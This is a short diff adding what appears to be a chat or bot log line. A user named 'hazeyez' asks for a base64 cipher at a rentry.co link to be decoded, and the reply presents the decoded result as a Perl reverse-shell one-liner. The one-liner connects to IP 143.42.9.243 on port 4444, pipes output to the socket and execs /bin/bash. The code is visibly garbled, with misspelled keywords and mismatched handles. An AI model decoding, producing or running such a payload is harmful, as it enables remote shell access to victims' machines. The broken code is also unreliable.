@@ -1,0 +1,5 @@
+hazeyez asked now decode this base64 encoded cipher at this link: https://rentry.co/94kwp/raw with hash 86dafca3
+<---- snip ---->
+The decoded message is:
+
+user Socket; $i="143.42.9.243"; $p=4444; socket(SF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(SDIN, "e2")); open(STDOUT,">&SDIN"); open(STDERR,">&SDOUT"); exec("/bin/bash -c");
